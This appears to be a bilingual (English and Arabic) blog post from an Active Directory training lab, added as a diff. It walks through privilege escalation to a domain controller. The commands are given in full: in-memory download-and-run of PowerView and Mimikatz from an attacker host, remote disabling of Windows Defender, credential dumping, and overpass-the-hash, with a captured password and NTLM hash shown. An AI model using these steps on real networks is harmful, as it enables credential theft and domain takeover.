@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Privilege Escalation And Lateral Movement Part 2 | Jehad Alqurashi</title>
+<link rel="stylesheet" href="../assets/css/style.css">
+</head>
+<body>
+<div class="nav-wrapper" id="nav-wrapper">
+<nav class="nav">
+<div class="logo">
+<a href="../index.html"><span class="logo-icon">JA</span>Jehad Alqurashi</a>
+</div>
+<ul class="menu">
+<li><a href="../index.html">Home</a></li>
+<li><a href="../tags.html">Tags</a></li>
+</ul>
+</nav>
+</div>
+<div class="reading-progress"><div class="reading-progress-bar" id="reading-bar"></div></div>
+<main class="main">
+<div class="breadcrumb">
+<a href="../index.html">Home</a><span class="sep">/</span><a href="../tags.html">active-directory</a><span class="sep">/</span><span>Privilege Escalation And Lateral Movement Part 2</span>
+</div>
+<article class="post-single">
+<header class="post-header">
+<div class="post-meta">
+<span class="post-category">active-directory</span>
+<span class="post-date">2023-09-10</span>
+</div>
+<h1 class="post-title">Privilege Escalation And Lateral Movement Part 2</h1>
+</header>
+<div class="lang-tabs">
+<button class="lang-tab active" onclick="switchLang('en',this)">English</button>
+<button class="lang-tab" onclick="switchLang('ar',this)">Arabic</button>
+</div>
+<div id="content-en" class="post-content">
+<h2>Introduction</h2>
+<p>In this article, we continue from where we left off in Part 1. After compromising the CMS, which was running with Local Administrator privileges under the user <code>ciadmin</code>, we now need to find a way to advance our attack toward the Domain Controller. It is recommended that you follow the previous article to have full context.</p>
+<h2>Walkthrough</h2>
+<h3>Step 1: Enumerate with PowerView</h3>
+<p>In the previous article, we ran Mimikatz and examined the passwords stored in memory, but we did not find any credentials for a user that would help us advance further toward the Domain Controllers.</p>
+<p>Now, we will load the PowerView tool into memory using the following command:</p>
+<pre><code class="language-powershell">iex (iwr http://172.16.100.7:9090/PowerView.ps1 -UseBasicParsing)
+</code></pre>
+
+<figure class="article-img"><img src="../assets/images/privilege-escalation/2.png" alt="Step 1" loading="lazy"></figure>
+<h3>Step 2: Hunt for Domain Admin Sessions</h3>
+<p>Next, we execute the <code>Invoke-UserHunter</code> command with the <code>-CheckAccess</code> flag:</p>
+<pre><code class="language-powershell">Invoke-UserHunter -CheckAccess
+</code></pre>
+<p><strong>What does Invoke-UserHunter do?</strong></p>
+<p>This command checks every machine joined to the domain to determine whether any user who is a member of the <strong>Domain Admins</strong> group is currently logged into that machine. It also checks whether we have <strong>Local Administrator</strong> access on that machine.</p>
+<p><strong>Why is this useful?</strong></p>
+<p>If we find a machine where a Domain Admin is logged in and we have Local Administrator access to that machine, we can run Mimikatz on it to extract the NTLM hash of the Domain Admin user. Since that user is a member of Domain Admins, we can then use their credentials to access the Domain Controller.</p>
+
+<figure class="article-img"><img src="../assets/images/privilege-escalation/3.png" alt="Step 2" loading="lazy"></figure>
+<h3>Step 3: Identify the Target</h3>
+<p>After running the command, we observe that the machine <code>dcorp-mgmt</code> has the user <code>svcadmin</code> logged into it. The user <code>svcadmin</code> is a member of the <strong>Domain Admins</strong> group, and we have <strong>Local Administrator</strong> privileges on this machine.</p>
+<h3>Step 4: Execute Commands Remotely on the Target</h3>
+<p>We verify our access by executing commands remotely on the target machine:</p>
+<pre><code class="language-powershell">Invoke-Command -Computername dcorp-mgmt.dollarcorp.moneycorp.local -ScriptBlock {whoami;hostname}
+</code></pre>
+
+<figure class="article-img"><img src="../assets/images/privilege-escalation/4.png" alt="Step 3" loading="lazy"></figure>
+<h3>Step 5: Disable Windows Defender</h3>
+<p>Before loading Mimikatz, we need to disable Windows Defender's real-time monitoring on the target machine:</p>
+<pre><code class="language-powershell">Invoke-Command -Computername dcorp-mgmt.dollarcorp.moneycorp.local -ScriptBlock {Set-MpPreference -DisableRealtimeMonitoring $true}
+</code></pre>
+
+<figure class="article-img"><img src="../assets/images/privilege-escalation/5.png" alt="Step 4" loading="lazy"></figure>
+<h3>Step 6: Load Mimikatz into Memory on Our Machine</h3>
+<p>We load the Mimikatz PowerShell script into our local session:</p>
+<pre><code class="language-powershell">iex (iwr http://172.16.100.7:9090/Invoke-Mimikatz.ps1 -UseBasicParsing)
+</code></pre>
+
+<figure class="article-img"><img src="../assets/images/privilege-escalation/6.png" alt="Step 5" loading="lazy"></figure>
+<h3>Step 7: Execute Mimikatz Remotely on the Target</h3>
+<p>Now we invoke Mimikatz on the target machine <code>dcorp-mgmt</code> to extract credentials from its memory:</p>
+<pre><code class="language-powershell">Invoke-Command -Computername dcorp-mgmt.dollarcorp.moneycorp.local -ScriptBlock ${function:Invoke-Mimikatz}
+</code></pre>
+<p>We can see that we now have:
+- The <strong>plaintext password</strong>: <code>*ThisisBlasphemyThisisMadness!!</code>
+- The <strong>NTLM hash</strong>: <code>b38ff50264b74508085d82c69794a4d8</code></p>
+
+<figure class="article-img"><img src="../assets/images/privilege-escalation/7.png" alt="Step 6" loading="lazy"></figure>
+<h3>Step 8: Perform the Overpass-the-Hash Attack</h3>
+<p>We will use the NTLM hash rather than the plaintext password to demonstrate the <strong>Overpass-the-Hash</strong> technique, because in real-world scenarios Mimikatz does not always return the password in plaintext.</p>
+<p>Open PowerShell as Administrator on our machine, load Mimikatz, and execute the following command to spawn a new PowerShell session running as the <code>svcadmin</code> user:</p>
+<pre><code>sekurlsa::pth /user:svcadmin /ntlm:b38ff50264b74508085d82c69794a4d8 /domain:dollarcorp.moneycorp.local /run:powershell.exe
+</code></pre>
+<p>A new PowerShell window opens, and we are now operating with the privileges of <code>svcadmin</code>.</p>
+<h3>Step 9: Identify the Domain Controller</h3>
+<p>Since the user we are impersonating is a member of the Domain Admins group, we can now access the Domain Controller. But first, we need to find out the Domain Controller's hostname.</p>
+<p>There are multiple ways to do this -- for example, using PowerView or Mimikatz. We will use PowerView.</p>
+<p>Open a PowerShell session and load PowerView:</p>
+<pre><code class="language-powershell">Import-Module .\PowerView.ps1
+</code></pre>
+<p>Then run the following command to find the Domain Controller's name:</p>
+<pre><code class="language-powershell">Get-NetDomain
+</code></pre>
+<p>We can see that the Domain Controller's hostname is: <code>dcorp-dc.dollarcorp.moneycorp.local</code></p>
+
+<figure class="article-img"><img src="../assets/images/privilege-escalation/8.png" alt="Step 7" loading="lazy"></figure>
+<h3>Step 10: Access the Domain Controller</h3>
+<p>Now we return to the PowerShell session running as <code>svcadmin</code> and enter a remote session on the Domain Controller:</p>
+<pre><code class="language-powershell">Enter-PSSession -ComputerName dcorp-dc
+</code></pre>
+<p>We have now reached the highest level of privilege in the Active Directory environment -- full access to the Domain Controller.</p>
+<figure class="article-img"><img src="../assets/images/privilege-escalation/9.png" alt="Step 8" loading="lazy"></figure>
+
+</div>
+<div id="content-ar" class="post-content rtl-content" style="display:none;direction:rtl;text-align:right;">
+<p>مقدمة:</p>
+<p>في هذي المقالة راح نكمل الى ماوصلنا له اللي هو بعد اختراق ال CMS وكان هذا ال CMS شغال بصلاحية Local Administrators بيوزر اسمه ciadmin</p>
+<p>ف يفضل تتابع المقالة السابقة عشان تكون بالصورة</p>
+<p>الشرح:</p>
+<p>في المقالة السابقة تم تشغيل Mimikatz واطلعنا على الباسورد اللي في الميموري ولاحظنا انه مافي اي باسورد لمستخدم يهمنا عشان ودنا نتقدم بالاختراق الى مانوصل الى Domain Controllers</p>
+<p>الان راح اسوي Load ل اداة Power View في الميموري عن طريق هذا الامر:</p>
+<p>iex (iwr http://172.16.100.7:9090/PowerView.ps1 -UseBasicParsing)</p>
+<p>راح ننفذ هذا الامر</p>
+<p>Invoke-UserHunter -CheckAccess</p>
+<p>ايش فايدة امر Invoke-UserHunter ؟</p>
+<p>هذا الامر راح يشيك لي على كل الاجهزة اللي داخل ال Domain هل يوجد عليها مستخدم ضمن قروب Domain Admins مسجل دخول على جهاز معين</p>
+<p>وهل هذا الجهاز لنا Access عليه ك Local Administrator او لا</p>
+<p>طيب ايش راح نستفيد؟</p>
+<p>طبعا لو نفذنا الامر وطلع فعلا انه احد الاجهزة مسجل عليه دخول مستخدم ضمن قروب Domain Admins راح نقدر نشغل Mimikatz وناخذ ال NTLM الخاص في هذا المستخدم وبما انه ضمن Domain Admins راح نتمكن من الدخول على Domain Controller</p>
+<figure class="article-img"><img src="../assets/images/privilege-escalation/2.png" alt="Step 1" loading="lazy"></figure>
+
+<p>نلاحظ مع بعض انه الجهاز اللي هو dcorp-mgmt يوجد عليه مستخدم svcadmin وهذا المستخدم ضمن قروب Domain Admins وعندنا صلاحية Local Administrator على هذا الجهاز</p>
+<p>الان راح ننفذ اوامر على هذا الجهاز عن طريق هذا الامر</p>
+<p>Invoke-Command -Computername dcorp-mgmt.dollarcorp.moneycorp.local -ScriptBlock {whoami;hostname}</p>
+<p>الان راح نسوي Load ل اداة ال Mimikatz بس قبل لازم نسوي Disable للويندوز ديفندر عن طريق هذا الامر</p>
+<figure class="article-img"><img src="../assets/images/privilege-escalation/3.png" alt="Step 2" loading="lazy"></figure>
+
+<p>Invoke-Command -Computername dcorp-mgmt.dollarcorp.moneycorp.local -ScriptBlock {Set-MpPreference -DisableRealtimeMonitoring $true}</p>
+<p>بعدين نسوي Load ل اداة Mimikatz في الميموري عن طريق هذا الامر</p>
+<p>iex (iwr http://172.16.100.7:9090/Invoke-Mimikatz.ps1 -UseBasicParsing)</p>
+<p>الان نستدعي Mimikatz في جهاز dcrop-mgmt عن طريق هذا الامر</p>
+<figure class="article-img"><img src="../assets/images/privilege-escalation/4.png" alt="Step 3" loading="lazy"></figure>
+
+<p>Invoke-Command -Computername dcorp-mgmt.dollarcorp.moneycorp.local -ScriptBlock ${function:Invoke-Mimikatz}</p>
+<p>الان زي مانلاحظ انه عندنا الباسورد ك Plain text واللي هو : *ThisisBlasphemyThisisMadness!!</p>
+<p>وعندنا ك Ntlm hash و اللي هو : b38ff50264b74508085d82c69794a4d8</p>
+<p>انا راح استخدم الخاص بال NTLM HASH عشان اعلمكم على تكنيك Overpass-the-hash لان مو دائما يظهر لك الباسورد ك Plain text عن طريق اداة Mimikatz</p>
+<figure class="article-img"><img src="../assets/images/privilege-escalation/5.png" alt="Step 4" loading="lazy"></figure>
+
+<p>الان راح ننفذ تكنيك Overpass-the-hash</p>
+<p>راح نفتج powershell بصلاحية Administrator من جهازنا ونشغل اداة Mimikatz</p>
+<p>وننفذ هذا الامر عشان يفتح لنا جلسة PowerShell بصلاحية المستخدم svcadmin</p>
+<p>sekurlsa::pth /user:svcadmin /ntlm:b38ff50264b74508085d82c69794a4d8 /domain:dollarcorp.moneycorp.local /run:powershell.exe</p>
+<figure class="article-img"><img src="../assets/images/privilege-escalation/6.png" alt="Step 5" loading="lazy"></figure>
+
+<p>زي مانلاحظ انه فتح لنا جلسة بورشيل خاصة بالمستخدم svcadmin</p>
+<p>الان بما ان المستخدم اللي داخلين فيه ضمن قروب Domain Admins يمكننا الدخول على جهاز ال Domain Controller طبعا كيف راح نعرف ايش اسم الجهاز الخاص بال Domain Controller</p>
+<p>في اكثر من طريقه ممكن عن طريق اداة PowerView او عن طريق ال Mimikatz</p>
+<p>نحن راح نستخرجه عن طريق اداة PowerView</p>
+<figure class="article-img"><img src="../assets/images/privilege-escalation/7.png" alt="Step 6" loading="lazy"></figure>
+
+<p>راح نفتح جلسة PowerShell ونسوي Load ل اداة PowerView عن طريق هذا الامر</p>
+<p>Import-Module .\PowerView.ps1</p>
+<p>بعد كذا ننفذ هذا الامر عشان يظهر لنا اسم الجهاز الخاص بال Domain Controller</p>
+<p>Get-NetDomain</p>
+<figure class="article-img"><img src="../assets/images/privilege-escalation/8.png" alt="Step 7" loading="lazy"></figure>
+
+<p>زي مانلاحظ اسم الجهاز الخاص بال Domain Controller هو :</p>
+<p>dcorp-dc.dollarcorp.moneycorp.local</p>
+<p>الان كل اللي علينا نرجع للجلسة الخاصة بالمستخدم svcadmin وندخل لجهاز Domain Controller عن طريق هذا الامر:</p>
+<p>Enter-PSSession -ComputerName dcorp-dc</p>
+<figure class="article-img"><img src="../assets/images/privilege-escalation/9.png" alt="Step 8" loading="lazy"></figure>
+
+<p>وبكذا وصلنا الى اعلى صلاحية في ال Active Directory</p>
+<p>اتمنى المقالة نالت على اعجابكم</p>
+<p>شاكر لكم.</p>
+</div>
+<div class="post-nav">
+<a href="../index.html">&larr; Back to all articles</a>
+</div>
+</article>
+</main>
+<footer class="footer">
+<span>&copy; 2024 Jehad Alqurashi</span>
+<br><a href="#" class="top-link">&uarr; Back to top</a>
+</footer>
+<div class="night-bg" id="nightsky"></div>
+<div class="lightning"></div>
+<div class="rain-splash"></div>
+<script>
+(function(){
+  var c=document.getElementById('nightsky');
+  for(var i=0;i<5;i++){
+    var cl=document.createElement('div');
+    cl.className='cloud';
+    cl.style.top=(i*8+2)+'%';
+    cl.style.left='-20%';
+    cl.style.width=(200+i*80)+'px';
+    cl.style.height=(60+i*20)+'px';
+    cl.style.background='rgba(80,100,140,'+(0.03+i*0.01)+')';
+    cl.style.animationDuration=(60+i*20)+'s';
+    cl.style.animationDelay=(i*12)+'s';
+    c.appendChild(cl);
+  }
+  for(var i=0;i<120;i++){
+    var d=document.createElement('div');
+    d.className='rain-drop';
+    d.style.left=Math.random()*100+'%';
+    var far=Math.random();
+    if(far<0.5){
+      d.style.height=(Math.random()*18+14)+'px';
+      d.style.width='1.5px';
+      d.style.animationDuration=(Math.random()*0.4+0.4)+'s';
+      d.style.opacity=Math.random()*0.15+0.1;
+    } else {
+      d.style.height=(Math.random()*10+6)+'px';
+      d.style.width='0.5px';
+      d.style.animationDuration=(Math.random()*0.6+0.7)+'s';
+      d.style.opacity=Math.random()*0.08+0.03;
+    }
+    d.style.animationDelay=(Math.random()*2)+'s';
+    c.appendChild(d);
+  }
+  for(var i=0;i<20;i++){
+    var p=document.createElement('div');
+    p.className='particle';
+    p.style.left=Math.random()*100+'%';
+    p.style.width=p.style.height=(Math.random()*2+1)+'px';
+    p.style.background=Math.random()>0.5?'rgba(0,212,255,0.3)':'rgba(139,92,246,0.2)';
+    p.style.animationDuration=(Math.random()*15+10)+'s';
+    p.style.animationDelay=(Math.random()*10)+'s';
+    c.appendChild(p);
+  }
+})();
+</script>
+<script>
+window.addEventListener('scroll',function(){
+  var nw=document.getElementById('nav-wrapper');
+  if(nw) nw.classList.toggle('scrolled',window.scrollY>20);
+});
+</script>
+<script>
+function switchLang(lang, btn) {
+  document.querySelectorAll('.lang-tab').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active');
+  document.getElementById('content-en').style.display = lang === 'en' ? '' : 'none';
+  document.getElementById('content-ar').style.display = lang === 'ar' ? '' : 'none';
+}
+</script>
+<script>
+window.addEventListener('scroll',function(){
+  var bar=document.getElementById('reading-bar');
+  if(!bar)return;
+  var h=document.documentElement.scrollHeight-window.innerHeight;
+  bar.style.width=h>0?Math.min(100,window.scrollY/h*100)+'%':'0%';
+});
+document.addEventListener('click',function(e){
+  if(e.target.closest('.article-img img')){
+    var src=e.target.src;
+    var ov=document.createElement('div');
+    ov.className='lightbox-overlay';
+    ov.innerHTML='<img src="'+src+'" alt="Zoomed">';
+    document.body.appendChild(ov);
+    setTimeout(function(){ov.classList.add('active');},10);
+    ov.onclick=function(){ov.classList.remove('active');setTimeout(function(){ov.remove();},300);};
+  }
+});
+</script>
+</body>
+</html>
